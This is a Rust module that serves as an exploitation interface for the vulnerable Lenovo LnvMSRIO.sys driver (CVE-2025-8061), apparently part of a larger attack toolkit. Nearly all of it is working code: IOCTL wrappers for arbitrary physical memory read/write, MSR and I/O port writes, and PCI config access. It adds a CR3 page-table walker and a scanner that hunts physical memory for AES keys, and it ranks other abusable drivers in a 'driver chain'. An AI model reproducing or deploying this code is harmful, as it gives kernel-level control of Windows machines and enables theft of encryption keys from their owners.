//! LnvMSRIO.sys Driver Backend
//!
//! CVE-2025-8061 - Lenovo MSR I/O Driver exploitation interface
//! Device: \\.\WinMsrDev
//!
//! Capabilities:
//! - Unrestricted physical memory read/write (MmMapIoSpace)
//! - MSR read/write (RDMSR/WRMSR)
//! - I/O port read/write (IN/OUT)
//! - PCI configuration space read/write (HalGetBusData)
//!
//! STATIC ANALYSIS ONLY - Do not load the driver.

use std::io;
use std::mem;
use std::ptr;

// Windows FFI
#[cfg(windows)]
mod ffi {
    use std::ffi::c_void;

    pub type HANDLE = *mut c_void;
    pub type DWORD = u32;
    pub type BOOL = i32;
    pub type LPCWSTR = *const u16;

    pub const INVALID_HANDLE_VALUE: HANDLE = -1isize as HANDLE;
    pub const GENERIC_READ: DWORD = 0x80000000;
    pub const GENERIC_WRITE: DWORD = 0x40000000;
    pub const FILE_SHARE_READ: DWORD = 0x00000001;
    pub const FILE_SHARE_WRITE: DWORD = 0x00000002;
    pub const OPEN_EXISTING: DWORD = 3;
    pub const FILE_ATTRIBUTE_NORMAL: DWORD = 0x80;

    extern "system" {
        pub fn CreateFileW(
            lpFileName: LPCWSTR,
            dwDesiredAccess: DWORD,
            dwShareMode: DWORD,
            lpSecurityAttributes: *mut c_void,
            dwCreationDisposition: DWORD,
            dwFlagsAndAttributes: DWORD,
            hTemplateFile: HANDLE,
        ) -> HANDLE;

        pub fn DeviceIoControl(
            hDevice: HANDLE,
            dwIoControlCode: DWORD,
            lpInBuffer: *const c_void,
            nInBufferSize: DWORD,
            lpOutBuffer: *mut c_void,
            nOutBufferSize: DWORD,
            lpBytesReturned: *mut DWORD,
            lpOverlapped: *mut c_void,
        ) -> BOOL;

        pub fn CloseHandle(hObject: HANDLE) -> BOOL;
        pub fn GetLastError() -> DWORD;
    }
}

// =============================================================================
// IOCTL Codes
// =============================================================================

/// Get driver version (returns 0x1000000)
pub const IOCTL_GET_VERSION: u32 = 0x9C402000;

/// Get reference count
pub const IOCTL_GET_REFCOUNT: u32 = 0x9C402004;

/// Read Model-Specific Register (RDMSR)
pub const IOCTL_MSR_READ: u32 = 0x9C402084;

/// Write Model-Specific Register (WRMSR)
pub const IOCTL_MSR_WRITE: u32 = 0x9C402088;

/// Read Performance Monitoring Counter (RDPMC)
pub const IOCTL_RDPMC: u32 = 0x9C40208C;

/// CPU Halt (HLT)
pub const IOCTL_CPU_HALT: u32 = 0x9C402090;

/// I/O Port Read BYTE (IN AL, DX)
pub const IOCTL_IO_PORT_READ_BYTE: u32 = 0x9C4060CC;

/// I/O Port Read WORD (IN AX, DX)
pub const IOCTL_IO_PORT_READ_WORD: u32 = 0x9C4060D0;

/// I/O Port Read DWORD (IN EAX, DX)
pub const IOCTL_IO_PORT_READ_DWORD: u32 = 0x9C4060D4;

/// Physical Memory READ (MmMapIoSpace)
pub const IOCTL_PHYS_MEM_READ: u32 = 0x9C406104;

/// PCI Configuration Space Read (HalGetBusDataByOffset)
pub const IOCTL_PCI_CONFIG_READ: u32 = 0x9C406144;

/// I/O Port Write BYTE (OUT DX, AL)
pub const IOCTL_IO_PORT_WRITE_BYTE: u32 = 0x9C40A0D8;

/// I/O Port Write WORD (OUT DX, AX)
pub const IOCTL_IO_PORT_WRITE_WORD: u32 = 0x9C40A0DC;

/// I/O Port Write DWORD (OUT DX, EAX)
pub const IOCTL_IO_PORT_WRITE_DWORD: u32 = 0x9C40A0E0;

/// Physical Memory WRITE (MmMapIoSpace)
pub const IOCTL_PHYS_MEM_WRITE: u32 = 0x9C40A108;

/// PCI Configuration Space Write (HalSetBusDataByOffset)
pub const IOCTL_PCI_CONFIG_WRITE: u32 = 0x9C40A148;

// =============================================================================
// Input/Output Structures
// =============================================================================

/// Physical memory read input (16 bytes, METHOD_BUFFERED)
#[repr(C, packed)]
#[derive(Debug, Clone, Copy)]
pub struct PhysMemReadInput {
    /// Target physical address
    pub physical_address: u64,
    /// Element access size: 1=BYTE, 2=WORD, 8=QWORD
    pub access_size: u32,
    /// Number of elements to read (total bytes = access_size * count)
    pub count: u32,
}

/// Physical memory write input (16-byte header + data, METHOD_BUFFERED)
#[repr(C, packed)]
#[derive(Debug, Clone, Copy)]
pub struct PhysMemWriteHeader {
    /// Target physical address
    pub physical_address: u64,
    /// Element access size: 1=BYTE, 2=WORD, 8=QWORD
    pub access_size: u32,
    /// Number of elements to write
    pub count: u32,
    // Data follows immediately after (at offset 16)
}

/// MSR read input (4 bytes)
#[repr(C, packed)]
#[derive(Debug, Clone, Copy)]
pub struct MsrReadInput {
    /// MSR register index
    pub msr_index: u32,
}

/// MSR read output (8 bytes)
#[repr(C, packed)]
#[derive(Debug, Clone, Copy)]
pub struct MsrReadOutput {
    /// 64-bit MSR value (EDX:EAX combined)
    pub value: u64,
}

/// MSR write input (12 bytes, note: value is unaligned at offset 4)
#[repr(C, packed)]
#[derive(Debug, Clone, Copy)]
pub struct MsrWriteInput {
    /// MSR register index
    pub msr_index: u32,
    /// 64-bit value to write (unaligned!)
    pub value: u64,
}

/// I/O port read input (4 bytes)
#[repr(C, packed)]
#[derive(Debug, Clone, Copy)]
pub struct IoPortReadInput {
    /// I/O port number (0x0000-0xFFFF)
    pub port: u32,
}

/// I/O port write input (8 bytes)
#[repr(C, packed)]
#[derive(Debug, Clone, Copy)]
pub struct IoPortWriteInput {
    /// I/O port number
    pub port: u32,
    /// Value to write (byte/word/dword depending on IOCTL)
    pub value: u32,
}

/// PCI config read input (8 bytes)
#[repr(C, packed)]
#[derive(Debug, Clone, Copy)]
pub struct PciConfigReadInput {
    /// Bus/Device/Function encoded:
    ///   bits[15:8] = Bus number
    ///   bits[7:3]  = Device number
    ///   bits[2:0]  = Function number
    pub bdf: u32,
    /// Register offset within config space
    pub offset: u32,
}

// =============================================================================
// Driver Handle
// =============================================================================

/// Handle to the LnvMSRIO driver device
pub struct LnvMsrioDriver {
    handle: ffi::HANDLE,
}

impl LnvMsrioDriver {
    /// Device path for usermode access
    const DEVICE_PATH: &'static str = "\\\\.\\WinMsrDev";

    /// Open a handle to the LnvMSRIO device.
    /// Requires the driver to already be loaded.
    pub fn open() -> io::Result<Self> {
        let wide_path: Vec<u16> = Self::DEVICE_PATH
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();

        let handle = unsafe {
            ffi::CreateFileW(
                wide_path.as_ptr(),
                ffi::GENERIC_READ | ffi::GENERIC_WRITE,
                ffi::FILE_SHARE_READ | ffi::FILE_SHARE_WRITE,
                ptr::null_mut(),
                ffi::OPEN_EXISTING,
                ffi::FILE_ATTRIBUTE_NORMAL,
                ptr::null_mut(),
            )
        };

        if handle == ffi::INVALID_HANDLE_VALUE {
            return Err(io::Error::last_os_error());
        }

        Ok(Self { handle })
    }

    /// Send an IOCTL to the driver (generic helper)
    fn ioctl(
        &self,
        code: u32,
        input: *const u8,
        input_len: u32,
        output: *mut u8,
        output_len: u32,
    ) -> io::Result<u32> {
        let mut bytes_returned: u32 = 0;

        let result = unsafe {
            ffi::DeviceIoControl(
                self.handle,
                code,
                input as *const _,
                input_len,
                output as *mut _,
                output_len,
                &mut bytes_returned,
                ptr::null_mut(),
            )
        };

        if result == 0 {
            Err(io::Error::last_os_error())
        } else {
            Ok(bytes_returned)
        }
    }

    // =========================================================================
    // Physical Memory Operations
    // =========================================================================

    /// Read physical memory at the given address.
    /// Uses MmMapIoSpace internally - no address restrictions.
    pub fn read_physical_memory(&self, phys_addr: u64, buffer: &mut [u8]) -> io::Result<()> {
        if buffer.is_empty() {
            return Ok(());
        }

        let input = PhysMemReadInput {
            physical_address: phys_addr,
            access_size: 1, // byte access for arbitrary sizes
            count: buffer.len() as u32,
        };

        let bytes_returned = self.ioctl(
            IOCTL_PHYS_MEM_READ,
            &input as *const _ as *const u8,
            mem::size_of::<PhysMemReadInput>() as u32,
            buffer.as_mut_ptr(),
            buffer.len() as u32,
        )?;

        if bytes_returned as usize != buffer.len() {
            return Err(io::Error::new(
                io::ErrorKind::UnexpectedEof,
                format!(
                    "Expected {} bytes, got {}",
                    buffer.len(),
                    bytes_returned
                ),
            ));
        }

        Ok(())
    }

    /// Write physical memory at the given address.
    /// Uses MmMapIoSpace internally - no address restrictions.
    pub fn write_physical_memory(&self, phys_addr: u64, data: &[u8]) -> io::Result<()> {
        if data.is_empty() {
            return Ok(());
        }

        // Build input: 16-byte header + data
        let total_size = 16 + data.len();
        let mut input_buf = vec![0u8; total_size];

        // Write header
        let header = PhysMemWriteHeader {
            physical_address: phys_addr,
            access_size: 1,
            count: data.len() as u32,
        };
        unsafe {
            ptr::copy_nonoverlapping(
                &header as *const _ as *const u8,
                input_buf.as_mut_ptr(),
                16,
            );
        }

        // Copy data after header
        input_buf[16..].copy_from_slice(data);

        self.ioctl(
            IOCTL_PHYS_MEM_WRITE,
            input_buf.as_ptr(),
            total_size as u32,
            ptr::null_mut(),
            0,
        )?;

        Ok(())
    }

    /// Read a u32 from physical memory
    pub fn read_phys_u32(&self, phys_addr: u64) -> io::Result<u32> {
        let mut buf = [0u8; 4];
        self.read_physical_memory(phys_addr, &mut buf)?;
        Ok(u32::from_le_bytes(buf))
    }

    /// Read a u64 from physical memory
    pub fn read_phys_u64(&self, phys_addr: u64) -> io::Result<u64> {
        let mut buf = [0u8; 8];
        self.read_physical_memory(phys_addr, &mut buf)?;
        Ok(u64::from_le_bytes(buf))
    }

    /// Write a u64 to physical memory
    pub fn write_phys_u64(&self, phys_addr: u64, value: u64) -> io::Result<()> {
        self.write_physical_memory(phys_addr, &value.to_le_bytes())
    }

    // =========================================================================
    // MSR Operations
    // =========================================================================

    /// Read a Model-Specific Register. No index validation - any MSR accessible.
    pub fn read_msr(&self, msr_index: u32) -> io::Result<u64> {
        let input = MsrReadInput { msr_index };
        let mut output = MsrReadOutput { value: 0 };

        self.ioctl(
            IOCTL_MSR_READ,
            &input as *const _ as *const u8,
            mem::size_of::<MsrReadInput>() as u32,
            &mut output as *mut _ as *mut u8,
            mem::size_of::<MsrReadOutput>() as u32,
        )?;

        Ok(output.value)
    }

    /// Write a Model-Specific Register. No index validation.
    pub fn write_msr(&self, msr_index: u32, value: u64) -> io::Result<()> {
        let input = MsrWriteInput { msr_index, value };

        self.ioctl(
            IOCTL_MSR_WRITE,
            &input as *const _ as *const u8,
            mem::size_of::<MsrWriteInput>() as u32,
            ptr::null_mut(),
            0,
        )?;

        Ok(())
    }

    // =========================================================================
    // I/O Port Operations
    // =========================================================================

    /// Read a byte from an I/O port
    pub fn io_port_read_byte(&self, port: u16) -> io::Result<u8> {
        let input = IoPortReadInput { port: port as u32 };
        let mut output: u8 = 0;

        self.ioctl(
            IOCTL_IO_PORT_READ_BYTE,
            &input as *const _ as *const u8,
            mem::size_of::<IoPortReadInput>() as u32,
            &mut output as *mut u8,
            1,
        )?;

        Ok(output)
    }

    /// Read a word from an I/O port
    pub fn io_port_read_word(&self, port: u16) -> io::Result<u16> {
        let input = IoPortReadInput { port: port as u32 };
        let mut output: u16 = 0;

        self.ioctl(
            IOCTL_IO_PORT_READ_WORD,
            &input as *const _ as *const u8,
            mem::size_of::<IoPortReadInput>() as u32,
            &mut output as *mut _ as *mut u8,
            2,
        )?;

        Ok(output)
    }

    /// Read a dword from an I/O port
    pub fn io_port_read_dword(&self, port: u16) -> io::Result<u32> {
        let input = IoPortReadInput { port: port as u32 };
        let mut output: u32 = 0;

        self.ioctl(
            IOCTL_IO_PORT_READ_DWORD,
            &input as *const _ as *const u8,
            mem::size_of::<IoPortReadInput>() as u32,
            &mut output as *mut _ as *mut u8,
            4,
        )?;

        Ok(output)
    }

    /// Write a byte to an I/O port
    pub fn io_port_write_byte(&self, port: u16, value: u8) -> io::Result<()> {
        let input = IoPortWriteInput {
            port: port as u32,
            value: value as u32,
        };

        self.ioctl(
            IOCTL_IO_PORT_WRITE_BYTE,
            &input as *const _ as *const u8,
            mem::size_of::<IoPortWriteInput>() as u32,
            ptr::null_mut(),
            0,
        )?;

        Ok(())
    }

    /// Write a dword to an I/O port
    pub fn io_port_write_dword(&self, port: u16, value: u32) -> io::Result<()> {
        let input = IoPortWriteInput {
            port: port as u32,
            value,
        };

        self.ioctl(
            IOCTL_IO_PORT_WRITE_DWORD,
            &input as *const _ as *const u8,
            mem::size_of::<IoPortWriteInput>() as u32,
            ptr::null_mut(),
            0,
        )?;

        Ok(())
    }

    // =========================================================================
    // PCI Configuration Space
    // =========================================================================

    /// Encode Bus/Device/Function into the driver's BDF format
    /// bits[15:8] = bus, bits[7:3] = device, bits[2:0] = function
    fn encode_bdf(bus: u8, device: u8, function: u8) -> u32 {
        ((bus as u32) << 8) | ((device as u32 & 0x1F) << 3) | (function as u32 & 0x07)
    }

    /// Read PCI configuration space
    pub fn pci_config_read(
        &self,
        bus: u8,
        device: u8,
        function: u8,
        offset: u32,
        buffer: &mut [u8],
    ) -> io::Result<()> {
        let input = PciConfigReadInput {
            bdf: Self::encode_bdf(bus, device, function),
            offset,
        };

        self.ioctl(
            IOCTL_PCI_CONFIG_READ,
            &input as *const _ as *const u8,
            mem::size_of::<PciConfigReadInput>() as u32,
            buffer.as_mut_ptr(),
            buffer.len() as u32,
        )?;

        Ok(())
    }

    /// Write PCI configuration space
    pub fn pci_config_write(
        &self,
        bus: u8,
        device: u8,
        function: u8,
        offset: u32,
        data: &[u8],
    ) -> io::Result<()> {
        // Build input: 8-byte header + data
        let total_size = 8 + data.len();
        let mut input_buf = vec![0u8; total_size];

        let header = PciConfigReadInput {
            bdf: Self::encode_bdf(bus, device, function),
            offset,
        };
        unsafe {
            ptr::copy_nonoverlapping(
                &header as *const _ as *const u8,
                input_buf.as_mut_ptr(),
                8,
            );
        }
        input_buf[8..].copy_from_slice(data);

        self.ioctl(
            IOCTL_PCI_CONFIG_WRITE,
            input_buf.as_ptr(),
            total_size as u32,
            ptr::null_mut(),
            0,
        )?;

        Ok(())
    }

    // =========================================================================
    // High-Level Helpers for toolkit
    // =========================================================================

    /// Scan physical memory range for a 16-byte AES key pattern.
    /// Returns all offsets where a potential key was found.
    pub fn scan_physical_for_aes_keys(
        &self,
        start_phys: u64,
        length: usize,
        known_plaintext: Option<&[u8]>,
    ) -> io::Result<Vec<(u64, [u8; 16])>> {
        const CHUNK_SIZE: usize = 4096;
        let mut results = Vec::new();
        let mut buffer = vec![0u8; CHUNK_SIZE];
        let mut offset = 0u64;

        while (offset as usize) < length {
            let read_size = CHUNK_SIZE.min(length - offset as usize);
            let buf_slice = &mut buffer[..read_size];

            match self.read_physical_memory(start_phys + offset, buf_slice) {
                Ok(()) => {
                    // Scan for potential AES keys (non-zero 16-byte sequences
                    // with high entropy)
                    for i in 0..read_size.saturating_sub(15) {
                        let candidate = &buf_slice[i..i + 16];

                        // Skip zero blocks
                        if candidate.iter().all(|&b| b == 0) {
                            continue;
                        }

                        // Skip blocks with too many repeated bytes
                        let mut byte_counts = [0u16; 256];
                        for &b in candidate {
                            byte_counts[b as usize] += 1;
                        }
                        let max_repeat = byte_counts.iter().max().copied().unwrap_or(0);
                        if max_repeat > 4 {
                            continue;
                        }

                        // If we have known plaintext, try to validate
                        if let Some(_plaintext) = known_plaintext {
                            // TODO: attempt trial decryption with candidate key
                            // For now, collect all high-entropy 16-byte blocks
                        }

                        let mut key = [0u8; 16];
                        key.copy_from_slice(candidate);
                        results.push((start_phys + offset + i as u64, key));
                    }
                }
                Err(e) => {
                    // Skip inaccessible pages (MMIO holes, etc.)
                    eprintln!(
                        "[warn] Failed to read phys 0x{:X}: {}",
                        start_phys + offset,
                        e
                    );
                }
            }

            offset += CHUNK_SIZE as u64;
        }

        Ok(results)
    }

    /// Walk x86-64 page tables starting from CR3 to translate a virtual address.
    /// Uses physical memory read to traverse PML4 -> PDPT -> PD -> PT.
    pub fn translate_virtual_to_physical(
        &self,
        cr3: u64,
        virtual_addr: u64,
    ) -> io::Result<Option<u64>> {
        let pml4_base = cr3 & 0x000F_FFFF_FFFF_F000;

        // PML4 index: bits [47:39]
        let pml4_idx = ((virtual_addr >> 39) & 0x1FF) as u64;
        let pml4e = self.read_phys_u64(pml4_base + pml4_idx * 8)?;
        if pml4e & 1 == 0 {
            return Ok(None); // Not present
        }

        // PDPT index: bits [38:30]
        let pdpt_base = pml4e & 0x000F_FFFF_FFFF_F000;
        let pdpt_idx = ((virtual_addr >> 30) & 0x1FF) as u64;
        let pdpte = self.read_phys_u64(pdpt_base + pdpt_idx * 8)?;
        if pdpte & 1 == 0 {
            return Ok(None);
        }
        // 1GB page?
        if pdpte & 0x80 != 0 {
            let phys = (pdpte & 0x000F_FFFF_C000_0000) | (virtual_addr & 0x3FFF_FFFF);
            return Ok(Some(phys));
        }

        // PD index: bits [29:21]
        let pd_base = pdpte & 0x000F_FFFF_FFFF_F000;
        let pd_idx = ((virtual_addr >> 21) & 0x1FF) as u64;
        let pde = self.read_phys_u64(pd_base + pd_idx * 8)?;
        if pde & 1 == 0 {
            return Ok(None);
        }
        // 2MB page?
        if pde & 0x80 != 0 {
            let phys = (pde & 0x000F_FFFF_FFE0_0000) | (virtual_addr & 0x001F_FFFF);
            return Ok(Some(phys));
        }

        // PT index: bits [20:12]
        let pt_base = pde & 0x000F_FFFF_FFFF_F000;
        let pt_idx = ((virtual_addr >> 12) & 0x1FF) as u64;
        let pte = self.read_phys_u64(pt_base + pt_idx * 8)?;
        if pte & 1 == 0 {
            return Ok(None);
        }

        let phys = (pte & 0x000F_FFFF_FFFF_F000) | (virtual_addr & 0xFFF);
        Ok(Some(phys))
    }

    /// Get driver version to verify connectivity
    pub fn get_version(&self) -> io::Result<u32> {
        let mut output: u32 = 0;

        self.ioctl(
            IOCTL_GET_VERSION,
            ptr::null(),
            0,
            &mut output as *mut _ as *mut u8,
            4,
        )?;

        Ok(output)
    }

    /// Check if the driver is responsive
    pub fn probe(&self) -> bool {
        self.get_version().is_ok()
    }
}

impl Drop for LnvMsrioDriver {
    fn drop(&mut self) {
        if self.handle != ffi::INVALID_HANDLE_VALUE {
            unsafe {
                ffi::CloseHandle(self.handle);
            }
            self.handle = ffi::INVALID_HANDLE_VALUE;
        }
    }
}

// Safety: The handle is only used via DeviceIoControl which is thread-safe
unsafe impl Send for LnvMsrioDriver {}

// =============================================================================
// Integration with toolkit driver chain
// =============================================================================

/// Driver info for the driver chain priority system
pub struct LnvMsrioInfo;

impl LnvMsrioInfo {
    pub const DRIVER_FILE: &'static str = "LnvMSRIO.sys";
    pub const DEVICE_PATH: &'static str = "\\\\.\\WinMsrDev";
    pub const SERVICE_NAME: &'static str = "LnvMSRIO";
    pub const REGISTRY_PATH: &'static str =
        "\\Registry\\Machine\\System\\CurrentControlSet\\Services\\LnvMSRIO";

    /// Check if driver is already loaded by attempting to open the device
    pub fn is_loaded() -> bool {
        LnvMsrioDriver::open().map(|d| d.probe()).unwrap_or(false)
    }

    /// Priority in driver chain (lower = preferred)
    /// LnvMSRIO > SIVX64 > ASMMAP64 > AsIO3
    pub const CHAIN_PRIORITY: u32 = 0;
}

// =============================================================================
// Tests (compile-time only, do not run without driver loaded)
// =============================================================================

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_struct_sizes() {
        assert_eq!(mem::size_of::<PhysMemReadInput>(), 16);
        assert_eq!(mem::size_of::<PhysMemWriteHeader>(), 16);
        assert_eq!(mem::size_of::<MsrReadInput>(), 4);
        assert_eq!(mem::size_of::<MsrReadOutput>(), 8);
        assert_eq!(mem::size_of::<MsrWriteInput>(), 12);
        assert_eq!(mem::size_of::<IoPortReadInput>(), 4);
        assert_eq!(mem::size_of::<IoPortWriteInput>(), 8);
        assert_eq!(mem::size_of::<PciConfigReadInput>(), 8);
    }

    #[test]
    fn test_bdf_encoding() {
        // Bus 0, Device 31, Function 0 -> 0x00F8
        assert_eq!(LnvMsrioDriver::encode_bdf(0, 31, 0), 0x00F8);
        // Bus 1, Device 0, Function 0 -> 0x0100
        assert_eq!(LnvMsrioDriver::encode_bdf(1, 0, 0), 0x0100);
        // Bus 0, Device 2, Function 1 -> 0x0011
        assert_eq!(LnvMsrioDriver::encode_bdf(0, 2, 1), 0x0011);
    }

    #[test]
    fn test_ioctl_codes() {
        // Verify IOCTL codes match expected device type 0x9C40
        assert_eq!(IOCTL_PHYS_MEM_READ >> 16, 0x9C40);
        assert_eq!(IOCTL_PHYS_MEM_WRITE >> 16, 0x9C40);
        assert_eq!(IOCTL_MSR_READ >> 16, 0x9C40);
        assert_eq!(IOCTL_MSR_WRITE >> 16, 0x9C40);
    }
}
